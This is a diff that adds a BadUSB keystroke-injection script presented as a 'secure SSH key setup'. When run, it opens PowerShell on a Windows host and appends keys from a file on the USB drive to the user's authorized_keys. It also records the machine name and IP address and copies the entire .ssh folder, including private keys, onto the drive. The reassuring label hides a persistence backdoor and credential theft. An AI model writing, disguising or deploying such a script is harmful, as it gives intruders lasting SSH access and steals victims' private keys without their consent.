@@ -1,0 +1,87 @@
+REM BadUSB script for Windows - Secure SSH Key Setup & Configuration
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Ensure SSH directory exists
+STRING if (!(Test-Path "$env:USERPROFILE\.ssh")) { mkdir "$env:USERPROFILE\.ssh" }
+ENTER
+STRING icacls "$env:USERPROFILE\.ssh" /grant "$env:USERNAME:F"
+ENTER
+
+REM Backup SSH configuration
+STRING Copy-Item -Recurse -Path "$env:USERPROFILE\.ssh" -Destination "$env:USERPROFILE\Documents\ssh_backup"
+ENTER
+
+REM Pull authorized keys from the key manager JSON
+STRING $Keys = Get-Content "E:\keys.json" | ConvertFrom-Json
+ENTER
+STRING foreach ($Key in $Keys.authorized_keys) { Add-Content -Path "$env:USERPROFILE\.ssh\authorized_keys" -Value $Key }
+ENTER
+
+REM Get IP Address and Device Name
+STRING $DeviceName = $env:COMPUTERNAME
+ENTER
+STRING $DeviceIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress
+ENTER
+
+REM Maintain structured SSH config
+STRING $ConfigContent = @"
+ENTER
+STRING # SSH Configuration File
+ENTER
+STRING Host *
+ENTER
+STRING     ForwardAgent no
+ENTER
+STRING     PasswordAuthentication no
+ENTER
+STRING     ChallengeResponseAuthentication no
+ENTER
+STRING     IdentityFile ~/.ssh/id_ecdsa_sk
+ENTER
+STRING     IdentityFile ~/.ssh/id_ecdsa_sk_rk
+ENTER
+STRING     IdentitiesOnly no
+ENTER
+STRING     KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group14-sha256
+ENTER
+STRING     Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com
+ENTER
+STRING     ServerAliveInterval 60
+ENTER
+STRING     ServerAliveCountMax 3
+ENTER
+STRING     StrictHostKeyChecking ask
+ENTER
+STRING     UserKnownHostsFile ~/.ssh/known_hosts
+ENTER
+STRING     TCPKeepAlive no
+ENTER
+STRING     PermitLocalCommand no
+ENTER
+STRING     RekeyLimit 1G 1h
+ENTER
+STRING     LogLevel VERBOSE
+ENTER
+STRING "@
+ENTER
+STRING $ConfigContent | Set-Content -Path "$env:USERPROFILE\.ssh\ssh_config"
+ENTER
+
+REM Secure the ssh_config
+STRING icacls "$env:USERPROFILE\.ssh\ssh_config" /inheritance:r /grant "$env:USERNAME:F"
+ENTER
+
+REM Save SSH keys and config to external storage
+STRING if (Test-Path "E:\") { Copy-Item -Recurse -Path "$env:USERPROFILE\.ssh" -Destination "E:\ssh_backup" }
+ENTER
+
+REM Notify completion
+STRING Write-Output "SSH Setup Complete for $DeviceName with IP $DeviceIP"
+ENTER
